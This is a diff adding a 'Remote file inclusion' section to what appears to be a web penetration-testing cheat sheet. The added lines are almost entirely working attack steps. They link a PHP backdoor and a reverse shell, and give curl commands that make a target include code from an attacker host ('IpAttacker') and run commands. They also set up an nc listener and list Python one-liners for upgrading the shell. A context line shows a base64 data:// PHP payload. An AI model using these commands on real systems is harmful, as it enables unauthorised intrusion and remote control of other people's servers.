@@ -39,6 +39,21 @@ curl http://site/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0
 
 ### Remote file inclusion
 
+Examples:
+- https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/simple-backdoor.php
+- https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+kali$ python -m http.server 80
+kali$ curl "http://sitetohack/index.php?page=http://IpAttacker/simple-backdoor.php&cmd=ls"
+kali$ nc -lnvp 4444
+kali$ curl "http://sitetohack/index.php?page=http://IpAttacker/php_reverse_shell.php"
+```
+
+Interactive TTY: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
 
 
 ## File upload
